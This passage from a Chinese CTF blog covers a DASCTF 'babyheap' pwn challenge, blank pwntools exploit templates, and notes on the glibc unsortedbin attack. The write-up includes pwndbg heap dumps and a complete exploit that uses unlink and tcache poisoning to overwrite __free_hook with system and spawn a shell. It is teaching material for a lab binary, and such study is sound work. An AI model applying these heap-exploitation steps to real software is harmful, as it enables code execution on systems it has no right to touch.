<p>填满chunk2，并修改chunk3的pre_size为伪造chunk大小</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x110</span></span><br><span class="line">payload += p64(<span class="number">0x220</span>)</span><br><span class="line">edit(<span class="number">15</span>,payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x555555adb3a0</span><br><span class="line">0x555555adb3a0:	0x0000000000000000	0x0000000000000121	#chunk2</span><br><span class="line">0x555555adb3b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb3c0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb3d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb3e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb3f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb400:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb410:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb420:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb430:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb440:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb450:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb460:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb470:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb490:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb4a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb4b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb4c0:	0x0000000000000220	0x0000000000000200	#chunk3</span><br><span class="line">0x555555adb4d0:	0x00007265746e6977	0x0000000000000000</span><br><span class="line">0x555555adb4e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="5-unlink合并"><a href="#5-unlink合并" class="headerlink" title="5.unlink合并"></a>5.unlink合并</h4><p>2.31中对unlink加入检查，需要size==pre_size</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>释放chunk3，则tcache满了，chunk3中chunk2的标志位为0，认为chunk2被释放，故进行向前合并，unlink</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">9</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55555654d090</span><br><span class="line">0x55555654d090:	0x0000000000000000	0x0000000000000111</span><br><span class="line">0x55555654d0a0:	0x0000000000000000	0x0000000000000421#fake_chunk大小改变</span><br><span class="line">0x55555654d0b0:	0x00007f809c23bbe0	0x00007f809c23bbe0</span><br><span class="line">0x55555654d0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555654d0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555654d0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555654d0f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555654d100:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 此时已经造成堆块重叠了。</p>
<p> chunk1、chunk2与合并后的chunk重叠，并且合并后的chunk在unsortedbin中</p>
</blockquote>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513202435970.png" alt="image-20210513202435970"></p>
<h4 id="6-释放chunk-bk"><a href="#6-释放chunk-bk" class="headerlink" title="6.释放chunk bk"></a>6.释放chunk bk</h4><p>释放chunk2和chunk4，tcache是先进先出</p>
<ul>
<li>释放chunk2、chunk4</li>
<li>chunk2 -&gt; chunk4</li>
<li>申请顺序是chunk4、chunk2</li>
</ul>
<blockquote>
<p>此时，chunk2中的fd指向下一个被释放的块</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x120 [  2]: 0x555556fae1b0 —▸ 0x555556fae4d0 ◂— 0x0</span><br><span class="line">0x200 [  7]: 0x555556fadea0 —▸ 0x555556fadca0 —▸ 0x555556fadaa0 —▸ 0x555556fad8a0 —▸ 0x555556fad6a0 —▸ 0x555556fad4a0 —▸ 0x555556fad2a0 ◂— 0x0</span><br></pre></td></tr></table></figure>

<h4 id="7-切割unsortbin"><a href="#7-切割unsortbin" class="headerlink" title="7.切割unsortbin"></a>7.切割unsortbin</h4><blockquote>
<p>申请一个大于chunk1大小的chunk，这样改chunk和chunk1+chunk2重叠</p>
<p>通过改chunk修改chunk2的fd指针，指向free_hook</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">18</span>,<span class="number">0x150</span>,<span class="string">"/bin/sh\x00"</span>+<span class="string">'a'</span>*<span class="number">0xf8</span>+p64(free_hook))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>原来0x421的chunk被分割前0x161给申请的块了</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5555560e0090</span><br><span class="line">0x5555560e0090:	0x0000000000000000	0x0000000000000111</span><br><span class="line">0x5555560e00a0:	0x0000000000000000	0x0000000000000161#申请的chunk</span><br><span class="line">0x5555560e00b0:	0x0068732f6e69622f	0x6161616161616161#填入binsh</span><br><span class="line">0x5555560e00c0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e00d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e00e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e00f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0100:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0110:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0120:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0130:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0140:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0150:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0160:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0170:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0180:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0190:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e01a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e01b0:	0x00007f2af2d3ab28	0x00005555560d0000#chunk2的fd被修改</span><br><span class="line">0x5555560e01c0:	0x6161616161616161	0x6161616161616161</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x120 [  2]: 0x5555560e01b0 —▸ 0x7f2af2d3ab28 (__free_hook) ◂— 0x0</span><br></pre></td></tr></table></figure>

<h4 id="8-申请chunk2的fd为新的chunk"><a href="#8-申请chunk2的fd为新的chunk" class="headerlink" title="8.申请chunk2的fd为新的chunk"></a>8.申请chunk2的fd为新的chunk</h4><blockquote>
<p>chunk2的fd被修改为free_hook</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">19</span>,<span class="number">0x118</span>,p64(system))</span><br><span class="line">add(<span class="number">20</span>,<span class="number">0x118</span>,p64(system))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x120 [  1]: 0x7f4deb068b28 (__free_hook) ◂— 0x0</span><br></pre></td></tr></table></figure>

<blockquote>
<p>free_hook作为chunk申请走了</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x200 [  7]: 0x55555636cea0 —▸ 0x55555636cca0 —▸ 0x55555636caa0 —▸ 0x55555636c8a0 —▸ 0x55555636c6a0 —▸ 0x55555636c4a0 —▸ 0x55555636c2a0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br></pre></td></tr></table></figure>

<h4 id="9-chunk2的内容作为参数，释放"><a href="#9-chunk2的内容作为参数，释放" class="headerlink" title="9.chunk2的内容作为参数，释放"></a>9.chunk2的内容作为参数，释放</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">18</span>)</span><br></pre></td></tr></table></figure>

<p>即可get shell</p>
<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">"babyheap"</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.31/lib/ld-2.31.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.31/lib/libc-2.31.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.31/lib/libc-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = remote()</span><br><span class="line">  elf = ELF(<span class="string">"./file"</span>)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"size?"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"content?"</span>)</span><br><span class="line">    p.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"(y/n)"</span>)</span><br><span class="line">	p.send(<span class="string">"n"</span>)<span class="comment">#not line</span></span><br><span class="line">	p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"content?"</span>)</span><br><span class="line">	p.sendline(str(content))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"gift: "</span>)</span><br><span class="line">puts_addr = int(p.recv(<span class="number">14</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"puts:"</span>+hex(puts_addr)) </span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	add(i+<span class="number">2</span>,<span class="number">0x1f8</span>,<span class="string">'winter'</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x404140</span></span><br><span class="line">fd = ptr - <span class="number">0x18</span></span><br><span class="line">bk = ptr - <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x108</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x221</span>)+p64(fd)+p64(bk))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x118</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x1f8</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x118</span>,<span class="string">'winter'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	delete(i+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x110</span></span><br><span class="line">payload += p64(<span class="number">0x220</span>)</span><br><span class="line">edit(<span class="number">15</span>,payload)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x150</span>,<span class="string">"/bin/sh\x00"</span>+<span class="string">'a'</span>*<span class="number">0xf8</span>+p64(free_hook))</span><br><span class="line">add(<span class="number">19</span>,<span class="number">0x118</span>,p64(system))</span><br><span class="line">add(<span class="number">20</span>,<span class="number">0x118</span>,p64(system))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="参考-amp-下载"><a href="#参考-amp-下载" class="headerlink" title="参考 &amp; 下载"></a>参考 &amp; 下载</h2><ul>
<li><p><a href="https://www.anquanke.com/post/id/236183" target="_blank" rel="noopener">MAR DASCTF题解</a></p>
</li>
<li><p><a href="https://www.anquanke.com/post/id/236179#h2-0" target="_blank" rel="noopener">2021 MAR DASCTF 部分PWN WriteUP</a></p>
</li>
<li><p><a href="https://r1nd0.github.io/2021/03/28/2021DASCTF-Mar-pwn-wp/" target="_blank" rel="noopener">2021DASCTF_Mar_pwn_wp(R1nd0)</a></p>
</li>
<li><p><a href="https://ainevsia.github.io/2021/03/30/2021MARDASCTF/" target="_blank" rel="noopener">2021MARDASCTF(无花果)</a></p>
</li>
</ul>

	
	</div>
  <a type="button" href="/2021/05/13/Mar-DASCTF明御攻防赛/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/13/pwn题模板/" >pwn wp模板</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-13  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="栈题"><a href="#栈题" class="headerlink" title="栈题"></a>栈题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = remote()</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil()</span><br><span class="line">p.sendline()</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="堆题"><a href="#堆题" class="headerlink" title="堆题"></a>堆题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = remote()</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil()</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil()</span><br><span class="line">    p.sendline()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2021/05/13/pwn题模板/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/13/unsortedbin-attack/" >unsortedbin attack</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-13  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="针对类型"><a href="#针对类型" class="headerlink" title="针对类型"></a>针对类型</h2><p>需要修改任意地址位一个较大的值</p>
<ol>
<li>修改循环次数，执行多次循环</li>
<li>修改heap的global_max_fast（使得更大的chunk可以视为fastbin）</li>
</ol>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>可修改unsortedbin的bk指针</p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="得到unsortbin方法"><a href="#得到unsortbin方法" class="headerlink" title="得到unsortbin方法"></a>得到unsortbin方法</h3><ol>
<li>一个大的chunk被分割 =&gt; 剩下的部分大于MINISIZE</li>
<li>释放一个不属于fastbin的chunk，该chunk不和top chunk相邻</li>
<li>进行malloc_consolidate，合并后的chunk放入unsortbin，且该chunk不和top chunk相邻</li>
</ol>
<h3 id="unosortbin链"><a href="#unosortbin链" class="headerlink" title="unosortbin链"></a>unosortbin链</h3><ol>
<li>采用FIFO的顺序</li>
<li>若fastbin和smallbin中没有对应大小块，则从unsortbin中取</li>
</ol>
<h3 id="main-arena-gt-libc-base"><a href="#main-arena-gt-libc-base" class="headerlink" title="main_arena =&gt; libc_base"></a>main_arena =&gt; libc_base</h3><p>因为main_arena和__malloc_hook只相差0x10，所以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base = main_arena - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h3><blockquote>
<p>当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p>
</blockquote>
<h4 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h4><ol>
<li>将一个chunk放入unsortedbin中</li>
<li>修改该chunk的bk指针为target-0x10</li>
<li>申请该大小的chunk</li>
</ol>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>修改target地址的值为&amp;main_arena+0x88</p>
